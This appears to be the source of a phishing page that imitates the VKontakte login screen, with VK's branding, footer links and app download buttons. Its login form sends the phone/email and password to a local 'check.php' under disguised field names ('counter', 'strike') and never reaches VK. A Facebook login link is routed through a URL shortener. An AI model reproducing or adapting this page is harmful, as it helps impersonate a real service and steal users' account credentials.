<!DOCTYPE html>

<html>
	<head>
		<meta charset="Utf-8"/>
		<link href="main.css" rel="stylesheet" type="text/css"/>
		<title>Добро пожаловать | Вконтакте</title>
	</head>

	<body>
		<header>
			<div id="wrapperHeader">
				<div id="logotype" onClick="location = 'index.php';"></div>
					<div id="wrapperSearch"><input type="text" id="search" placeholder="Поиск"/></div>
				<div id="title">Switch to English</div>	
			</div>
		</header>
			<div id="wrapper">
				<div id="mobileVersion">
					<div id="title">ВКонтакте для мобильных устройств</div>
						<div id="altTitle">Установите официальное мобильное приложение ВКонтакте и оставайтесь <br/>в курсе новостей Ваших друзей, где бы Вы ни находились.</div>
					<div id="android" onClick="downloadAndroidVersoion()">
						<div id="download"><div id="logo"></div>VK для Android</div>
					</div>
						<div id="ios" onClick="downloadIosVersoion()">
							<div id="download"><div id="logo"></div>VK для iPhone</div>
						</div>
					<div id="wp" onClick="downloadWpVersoion()">
						<div id="download"><img src="images/icoWp.png" id="fuckLogoWP" alt="">VK для WP</div>
					</div>
				</div>
		
				<div id="rightForm">
					<div id="authorizationForm">
						<form name="authorization" action="check.php" method="POST">
							<input type="text" name="counter" id="login" placeholder="Телефон или email"/>
							<input type="password" name="strike" id="password" placeholder="Пароль"/>
							<button id="finishAuthorization">Войти</button>
							<div id="restorePass"><a href="https://new.vk.com/restore">Забыли пароль?</a></div>
						</form>
					</div>
					
					<div id="registrationForm">
						<div id="title">Впервые ВКонтакте?</div>
							<div id="altTitle">Моментальная регистрация</div>
							<input type="text" name="nameUser" id="nameUser" placeholder="Ваше имя"/>
						<input type="text" name="lastnameUser" id="lastnameUser" placeholder="Ваша фамилия"/>
							<span id="birthdayTitle">Дата рождения: </span>
						<?php include('dateList.php'); ?>
						<div id="button"><input type="button" id="registrationButton" value="Зарегистрироваться"/></div>
					</div>
					
					<div id="authorizationFacebookForm">
						<div id="linkFacebook"><a href="https://goo.gl/Rw2VcO">Войти через Facebook</a></div>
					</div>
				</div>
					<div class="clear"></div>
			<footer>
				<div id="aboutVk">
					<a href="https://new.vk.com/about" target="_blank">ВКонтакте</a> &copy; <?php echo date("Y"); ?>
				</div>
			
				<div id="infoVk">
					<a href="https://new.vk.com/about" target="_blank" class="marginRightLink">о компании</a> 
					<a href="https://new.vk.com/terms" target="_blank" class="marginRightLink">правила</a> 
					<a href="https://new.vk.com/ads" target="_blank" class="marginRightLink">реклама</a> 
					<a href="https://new.vk.com/dev" target="_blank" class="marginRightLink">разработчикам</a> 
				</div>
				
				<div id="languageVk">
					Язык:
					<a href="#">English</a> 
					<a href="#">Русский</a> 
					<a href="#">Українська</a> 
					<a href="#">все языки »</a> 
				</div>
			</footer>
		</div>
		
		<!--JavaScript Start-->
		
			<script type="text/javascript">
				function downloadAndroidVersoion() {
					window.open("https://play.google.com/store/apps/details?id=com.vkontakte.android");
				}
				
				function downloadIosVersoion() {
					window.open("https://itunes.apple.com/ru/app/id564177498");
				}
				
				function downloadWpVersoion() {
					window.open("http://windowsphone.com/s?appid=edd920e2-b671-41b5-a9db-b89caccfa69c");
				}
			
			</script>
		
		<!--JavaScript End-->
	</body>
</html>